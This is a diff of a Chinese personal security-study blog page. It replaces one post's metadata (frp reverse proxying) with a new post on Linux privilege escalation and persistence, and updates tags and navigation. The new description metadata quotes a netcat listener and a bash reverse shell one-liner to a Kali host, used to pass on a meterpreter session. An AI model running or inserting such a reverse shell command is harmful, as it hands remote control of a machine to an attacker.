@@ -7,24 +7,28 @@
   <meta name="keywords" content="">
   <meta name="description" content="自解压捆绑木马 | 个人博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="1 什么是反向代理通过反向代理访问内网资源 2 方向代理工具-frpfrp 是一款高性能的反向代理应用，专注于内网穿透。它支持多种协议，包括 TCP、UDP、HTTP、HTTPS 等，并且具备 P2P 通信功能。使用 frp，您可以安全、便捷地将内网服务暴露到公网，通过拥有公网 IP 的节点进行中转。 3 frp-工作原理frp 主要由两个组件组成：客户端(frpc) 和 服务端(frps)。通常">
+<meta name="description" content="1 将meterpreter获得的权限，反弹到kail上。1.1 kaill监听端口1nc -nvlp 4444 &#x2F;&#x2F;nc是监听软件，4444是监听端口   1.2 meterpreter获取权限后，将权限反弹出来1bash -c &#x27;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.2.96&#x2F;4444 &lt;&amp;1&#x27; &#x2F;&#x2F;将权限反弹到指定ip">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内网穿透">
-<meta property="og:url" content="http://example.com/2024/08/14/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%88%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%EF%BC%89/index.html">
+<meta property="og:title" content="linux提权">
+<meta property="og:url" content="http://example.com/2024/10/11/1%20linux%E7%BB%B4%E6%9D%83%E5%92%8C%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="个人博客">
-<meta property="og:description" content="1 什么是反向代理通过反向代理访问内网资源 2 方向代理工具-frpfrp 是一款高性能的反向代理应用，专注于内网穿透。它支持多种协议，包括 TCP、UDP、HTTP、HTTPS 等，并且具备 P2P 通信功能。使用 frp，您可以安全、便捷地将内网服务暴露到公网，通过拥有公网 IP 的节点进行中转。 3 frp-工作原理frp 主要由两个组件组成：客户端(frpc) 和 服务端(frps)。通常">
+<meta property="og:description" content="1 将meterpreter获得的权限，反弹到kail上。1.1 kaill监听端口1nc -nvlp 4444 &#x2F;&#x2F;nc是监听软件，4444是监听端口   1.2 meterpreter获取权限后，将权限反弹出来1bash -c &#x27;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.2.96&#x2F;4444 &lt;&amp;1&#x27; &#x2F;&#x2F;将权限反弹到指定ip">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46258453/1723633607198-ccf1d460-d82a-4b0a-b5ba-c8e7b0a91938.png#averageHue=%23363635&clientId=ued4f7d65-a452-4&from=paste&height=241&id=u2f5495cf&originHeight=331&originWidth=1261&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=27585&status=done&style=none&taskId=u73a9f03e-5c4d-4b3f-87f1-2298ada027d&title=&width=917.0909090909091">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1723633012979-048af324-a695-42b3-8b44-bd29a5bec9e9.png?x-oss-process=image/format,webp#averageHue=%23040404&from=url&id=Cfzcg&originHeight=265&originWidth=581&originalType=binary&ratio=1.375&rotation=0&showTitle=false&status=done&style=none&title=">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46258453/1723636039152-81cbe099-70fc-4005-8688-a0bf63a7fe29.png#averageHue=%23fbfbfb&clientId=u3a4e4ba6-ef7b-4&from=paste&height=551&id=u185aa7b7&originHeight=757&originWidth=1331&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=47904&status=done&style=none&taskId=u25b94401-a098-4975-8a27-9bdd3cc79a1&title=&width=968">
-<meta property="article:published_time" content="2024-08-14T12:34:02.000Z">
-<meta property="article:modified_time" content="2024-08-14T12:06:34.526Z">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584076577-8dc5a9af-4a47-4ab9-b2d0-cbd67a4a686d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584181405-f6228c06-0936-47c3-904a-4707b55ced4d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584268726-aee52496-2f22-412a-8d9e-61f9e4e09560.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584463153-c472d14f-6d2e-4b8d-8174-a369c8043590.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584639753-87608500-4599-4b9f-9ea3-a684498c3a6d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722585283689-67ed8977-1087-471d-ac49-dbbb76fa842e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584836795-b45026c4-9849-4082-a2cf-b7fefe17e3fa.png">
+<meta property="article:published_time" content="2024-10-11T02:34:02.000Z">
+<meta property="article:modified_time" content="2024-10-11T03:39:20.574Z">
 <meta property="article:author" content="komobyte">
-<meta property="article:tag" content="内网">
-<meta property="article:tag" content="反向代理">
-<meta property="article:tag" content="内网穿透">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="维权">
+<meta property="article:tag" content="linux">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/46258453/1723633607198-ccf1d460-d82a-4b0a-b5ba-c8e7b0a91938.png#averageHue=%23363635&clientId=ued4f7d65-a452-4&from=paste&height=241&id=u2f5495cf&originHeight=331&originWidth=1261&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=27585&status=done&style=none&taskId=u73a9f03e-5c4d-4b3f-87f1-2298ada027d&title=&width=917.0909090909091">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584076577-8dc5a9af-4a47-4ab9-b2d0-cbd67a4a686d.png">
 
 
 <link rel="icon" href="/img/favicon.jpg">
@@ -251,7 +255,7 @@
     <li>
         <div class="all active" data-rel="全部文章">全部文章
             
-                <small>(14)</small>
+                <small>(15)</small>
             
         </div>
     </li>
@@ -278,7 +282,7 @@
         <div data-rel="网安学习">
             
             网安学习
-            <small>(9)</small>
+            <small>(10)</small>
         </div>
         
     </li>
@@ -306,8 +310,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="14">
-<input type="hidden" id="yelog_site_word_count" value="8.5k">
+<input type="hidden" id="yelog_site_posts_number" value="15">
+<input type="hidden" id="yelog_site_word_count" value="9.5k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -397,6 +401,14 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>提权</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>维权</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>信息收集</a>
             </li>
         
@@ -406,6 +418,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>CVE-2020-0796</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -430,6 +446,15 @@
 
     
     <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 网安学习 "
+           href="/2024/10/11/1%20linux%E7%BB%B4%E6%9D%83%E5%92%8C%E6%8F%90%E6%9D%83/"
+           data-tag="提权,维权,linux"
+           data-author="" >
+            <span class="post-title" title="linux提权">linux提权</span>
+            <span class="post-date" title="2024-10-11 10:34:02">2024/10/11</span>
+        </a>
         
         
         <a  class="全部文章 内网 "
